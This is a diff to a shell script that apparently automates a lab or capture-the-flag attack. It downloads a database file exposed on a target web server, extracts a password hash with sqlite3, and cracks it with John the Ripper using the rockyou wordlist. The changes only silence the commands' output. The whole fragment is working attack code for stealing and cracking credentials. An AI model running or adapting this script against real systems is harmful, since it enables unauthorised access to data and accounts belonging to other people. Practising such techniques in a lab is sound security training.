@@ -12,7 +12,7 @@ attack_ip="10.10.30.237"
 mkdir /work/ 2>/dev/null
 
 # Collect database content from assets directory (look at the page source code)
-wget http://$target_ip:81/assets/webapp.db
+wget -q http://$target_ip:81/assets/webapp.db
 mv webapp.db /work/webapp.db
 
 # Use sqlite3 to gather content
@@ -27,8 +27,8 @@ echo $HASH > /work/hash.txt
 
 # Crack it with John
 rm /opt/john/john.pot 2>/dev/null
-/opt/john/john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /work/hash.txt
-/opt/john/john --show /work/hash.txt
+/opt/john/john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /work/hash.txt 2>/dev/null
+/opt/john/john --show /work/hash.txt 2>/dev/null
 PASSWORD=$(cat /opt/john/john.pot | awk -F':' '{print $2}')
 echo $PASSWORD
 
